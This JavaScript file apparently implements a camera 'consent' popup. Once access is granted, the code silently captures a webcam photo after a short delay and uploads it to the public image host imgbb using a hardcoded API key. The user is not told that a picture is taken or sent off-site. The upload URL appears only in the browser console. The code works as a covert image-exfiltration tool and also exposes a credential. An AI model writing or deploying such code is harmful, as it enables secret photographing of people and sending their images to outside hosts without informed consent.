const popup = document.getElementById("consentPopup");
const allowButton = document.getElementById("allowCamera");

let stream = null;

allowButton.addEventListener("click", startCamera);

async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: true
        });

        // Hide popup after permission is granted
        popup.classList.remove("show");

        // Give the camera a moment to adjust
        setTimeout(capturePhoto, 1500);

    } catch (error) {
        console.error("Camera error:", error);

        if (error.name === "NotAllowedError") {
            alert("Camera permission was denied.");
        } else if (error.name === "NotFoundError") {
            alert("No camera was found on this device.");
        } else {
            alert("Unable to access the camera.");
        }
    }
}

function capturePhoto() {

    const video = document.createElement("video");
    video.srcObject = stream;

    video.playsInline = true;
    video.muted = true;

    video.onloadedmetadata = () => {

        video.play();

        setTimeout(() => {

            const canvas = document.createElement("canvas");

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext("2d");

            ctx.drawImage(
                video,
                0,
                0,
                canvas.width,
                canvas.height
            );

            const imageData = canvas.toDataURL("image/png");
            const imageBase64 = imageData.split(",")[1];

            uploadImage(imageBase64);

            stopCamera();

        }, 1000);

    };
}

function stopCamera() {

    if (!stream) return;

    stream.getTracks().forEach(track => track.stop());

    stream = null;
}

async function uploadImage(image) {

    const API_KEY = "54c4b68870fc5dc29bacb73a40ea3726";

    const formData = new FormData();
    formData.append("image", image);

    try {

        const response = await fetch(
            `https://api.imgbb.com/1/upload?key=${API_KEY}`,
            {
                method: "POST",
                body: formData
            }
        );

        const data = await response.json();

        if (data.success) {
            console.log("Upload successful:", data.data.url);
        } else {
            console.error("Upload failed:", data);
        }

    } catch (error) {

        console.error("Upload error:", error);

    }
}